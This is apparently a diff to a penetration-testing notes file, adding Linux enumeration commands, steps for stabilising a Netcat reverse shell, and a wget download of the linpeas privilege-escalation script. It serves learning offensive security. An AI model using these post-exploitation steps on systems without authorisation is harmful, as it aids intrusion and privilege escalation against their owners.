@@ -35,4 +35,35 @@ cat /proc/version
 # Can contain info on the OS
 cat /etc/issue
 
+# All running processes
+ps -A
+ps aux
+
+# Shows the list of commands the user is allowed to run as a root user.
+sudo -l
+
+# Show all files and directories, including hidden ones
+ls -la
+
+# Provide the information on the user's privilege level and the groups that the user is in.
+id
+
+# When pivoting, the ifconfig command provides information on the available network interfaces of the system.
+ifconfig
+
+# Stablizing Netcat shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Background the Netcat shell using CTRL+Z
+# Back in your own terminal type “stty raw -echo; fg”
+
+# Linpeas is a script for enumerating all possible directories for privilege escalation
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+
+
+
+
+
+
 
